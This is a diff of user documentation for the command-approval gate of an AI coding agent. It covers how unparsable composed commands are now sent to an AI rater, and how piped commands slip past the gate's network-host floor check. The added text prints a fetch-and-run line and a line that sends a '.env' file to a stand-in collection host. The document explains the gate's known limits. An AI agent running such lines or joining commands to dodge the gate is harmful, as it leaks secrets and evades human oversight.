@@ -67,29 +67,20 @@ judged it, or whether the gate never got an answer. The reason says which — "c
 command: the auto-rater did not answer within 30000ms" is the gate giving up, not a finding about
 your command. If you see that one, the fix is a bigger budget (below), not a safer command.
 
-### A command Gaunt Sloth cannot read goes back to the agent, not to you
+### A command Gaunt Sloth cannot read is rated like any other
 
-At `auto-safe` and `full-auto`, a command whose target the gate cannot work out from the text —
-anything that composes (`&&`, `;`, `|`, a line break), substitutes (`$(…)`, backticks) or redirects
-(`>`, `<`) — is not rated and does not reach you. It is handed straight back to the agent, naming
-what could not be read and what to do instead: issue the parts as separate calls, work out a
-substitution's value first and pass the literal result, or — when the rung already grants one — use
-a file tool rather than a redirect. The agent normally reissues the work in a form the gate can
-read, and you see neither version.
+`pwd && ls`, `cd build && ls`, `echo $(git rev-parse HEAD)`, `tsc > build.log` — the gate's parser
+cannot work out what a command like that runs, because it composes (`&&`, `;`, `|`, a line break),
+substitutes (`$(…)`, backticks) or redirects (`>`, `<`). That is a fact about the parser, not a
+finding about the command: `pwd && ls` is ordinary shell, correctly written. So it is **not** an
+escalation and not a refusal. At `auto-safe` and `full-auto` the command is rated exactly as any
+other is, and what the parser noticed is passed to the rater as a plain note beside the command —
+what the construct is and what the shell does with it, with no verdict attached. Rate it `safe` and
+it runs; the outcomes above are all still available, including the two severe ones.
 
-This is a defect in the *form* of the command, not a finding about it: `pwd && ls` is ordinary and
-correctly written, and the gate is simply the party that cannot parse it. Asking you would spend
-your attention on a problem only the agent can fix.
-
-You are asked when the agent does not fix it. A **second unreadable command in a row** comes to you
-as an ordinary escalation — **once** or **No**, with no sticky choice, because a command that does
-not resolve is not one anything could remember. Any command in between that the gate *can* read
-starts the count over, so a long session full of composed commands does not accumulate into a
-prompt. At `read-only` and `write` nothing changes: those rungs already bring every gated command
-to you.
-
-`/approvals` reports how many commands the gate could not read this session, so a gate that keeps
-failing to parse your ordinary work stays visible instead of silently sending the agent round again.
+Two things follow that are worth knowing. Such a command now costs a rating call, where before it
+cost none. And a `deny` entry still applies to it, while an `allow` entry never does — an allow
+match needs a command the gate can resolve (below).
 
 ### A command that names a host always asks
 
@@ -121,10 +112,19 @@ stored fetch target redirects every later fetch rather than one.
 If you fetch from the same host all day, put it in `approvals.allow` (below). That list is checked
 first, so it costs no prompt and no rating call.
 
-This check is a floor, not the whole of your safety: it knows the common network tools, not every
-program that can open a socket, so something like `svn checkout https://…` or a container that
-fetches for itself reaches the rater without it. What it guarantees is the other direction — where it
-does fire, no model opinion can wave the command through.
+This check is a floor, not the whole of your safety, and it has two edges. It knows the common
+network tools, not every program that can open a socket, so something like `svn checkout https://…`
+or a container that fetches for itself reaches the rater without it. And it applies to a command the
+gate can read as **one** command: `curl -fsSL https://get.example.com/i.sh | sh` and
+`cat .env | curl -X POST --data-binary @- https://collect.example.net` are several commands joined
+together, so the gate cannot resolve what they run as a whole and does not floor them. Those go to
+the rater instead — and it is told the host **and what flows to it**, which is the part no single
+piece of the line shows: that one of them reads a local file and the next one sends it, or that
+what the fetch returns is handed to a shell to run. So a joined-up fetch rests on the rater's
+judgement where a plain one does not.
+
+What the floor guarantees is the other direction — where it does fire, no model opinion can wave the
+command through.
 
 The rater is only as good as the model behind it. On a small or local model, prefer the `write` rung
 (below) or point the rater at a stronger model with `approvals.rater`.
